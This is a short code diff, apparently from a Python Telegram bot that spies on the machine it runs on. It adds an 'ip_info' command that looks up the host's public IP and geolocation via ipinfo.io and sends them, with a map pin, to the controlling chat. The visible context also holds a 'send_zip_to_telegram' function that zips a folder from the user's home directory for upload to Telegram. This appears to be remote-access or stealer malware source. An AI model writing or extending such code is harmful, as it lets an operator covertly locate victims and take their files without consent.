@@ -32,6 +32,23 @@ def pc_info(message):
     except Exception as e:
         error_message = f"ОШИБКА: {e}"
         bot.send_message(chat_id, error_message)
+@bot.message_handler(commands=['ip_info'])
+def ip_info(message):
+    chat_id = message.chat.id
+    bot.send_chat_action(chat_id, 'find_location')
+    info = requests.get('http://ipinfo.io').text
+    bot.send_message(chat_id, info)
+    location = loads(info)['loc'].split(',')
+    bot.send_location(chat_id, location[0], location[1])
+    try:
+        error_message = f"ВЫПОЛНЕННО!!!"
+        bot.send_message(chat_id, error_message)
+    except PermissionError as e:
+        error_message = f"ОШИБКА:: {e}"
+        bot.send_message(chat_id, error_message)
+    except Exception as e:
+        error_message = f"ОШИБКА: {e}"
+        bot.send_message(chat_id, error_message)
 user = os.path.expanduser("~")
 
 def send_zip_to_telegram(telegram_bot_token, chat_id, source_dir):
